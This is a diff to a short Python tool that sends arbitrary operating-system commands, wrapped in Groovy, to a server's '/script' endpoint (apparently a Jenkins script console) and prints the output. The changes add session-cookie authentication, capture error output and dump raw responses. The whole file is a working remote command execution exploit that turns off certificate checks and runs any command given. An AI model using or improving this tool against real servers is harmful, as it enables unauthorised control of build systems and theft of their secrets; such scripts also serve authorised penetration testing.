@@ -2,6 +2,7 @@
 import requests
 import argparse
 import re
+import json
 
 
 # IGNORE SSL WARNING ###########################################################
@@ -15,19 +16,24 @@ parser.add_argument('url', type=str)
 parser.add_argument('-u', '--user', type=str)
 parser.add_argument('-p', '--password', type=str)
 parser.add_argument('-c', '--command', type=str, required=True)
+parser.add_argument('-C', '--cookie', type=str)
 
 args = parser.parse_args()
 URL = args.url
+COOKIES = {}
 if args.user and args.password:
     AUTH = (args.user, args.password)
 else:
     AUTH = None
+if args.cookie:
+    COOKIES = json.loads(args.cookie)
 
-DATA = {'script':'def proc = "{}".execute();def os = new StringBuffer();proc.waitForProcessOutput(os, System.err);println(os.toString());'.format(args.command)}
+DATA = {'script':'def proc = "{}".execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());'.format(args.command)}
 
-r = requests.post(URL + '/script', data=DATA, auth=AUTH, verify=False)
+r = requests.post(URL + '/script', data=DATA, auth=AUTH, cookies=COOKIES, verify=False)
 m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
 if m:
     print(m.group(1))
 else:
     print('oops')
+    print(r.text)
